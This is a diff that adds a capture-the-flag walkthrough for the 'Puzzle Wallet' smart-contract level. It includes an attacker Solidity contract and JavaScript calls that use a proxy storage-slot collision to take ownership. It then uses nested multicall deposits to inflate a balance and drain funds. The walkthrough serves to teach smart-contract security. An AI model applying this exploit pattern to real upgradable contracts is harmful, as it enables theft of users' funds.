@@ -1128,3 +1128,58 @@ And finnally we can drain the token2 balance of the contract by doing
 ```js
 swap(token3, token2, 200)
 ```
+
+---
+
+### 24. Puzzle Wallet
+
+In order to hack this contract we should overwrite the `owner` and `maxBalance` variables with our address.
+
+Since the proxy pattern implies to utilize a contract to implement an "upgradable" logic we can play with the storage slots positions in order to hack it.
+
+The `proposeNewAdmin` function can be called by anyone, so after setting this variable we will overwrite the `owner` for the proxy contract.
+
+```js
+const proxy = await contract.owner();
+```
+
+We can create a custom contract in solidity to take the ownership of the `PuzzleWallet` contract.
+
+```sol
+contract Attacker {
+    function newAdmin(address _puzzle) public {
+        PuzzleProxy(_puzzle).proposeNewAdmin(msg.sender);
+    }
+}
+```
+
+Then we can simply call this `newAdmin` function sending the instance address as paramenter and the contract will be ours.
+
+Then, we have owner access to the wallet, so we can add our address to the whitelist
+
+```js
+contract.addToWhitelist(player)
+```
+
+Now we need to bypass the 0 balance condition. In order to do so, we can call a `multicall` function that invokes `deposit()` multiple times
+
+```js
+const depositData = await contract.methods["deposit()"].request();
+const multicallData = await contract.methods["multicall(bytes[])"].request([depositData])
+await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
+await contract.execute(player, toWei('0.002'), 0x0)
+```
+
+And that's it, we can check the balance of the contract as follows
+
+```js
+await getBalance(contract.address)
+```
+Finnally, we are able to set the `maxBalance` for the contract, which will override the admin slot.
+
+```js
+await contract.setMaxBalance(player)
+```
+
+
+
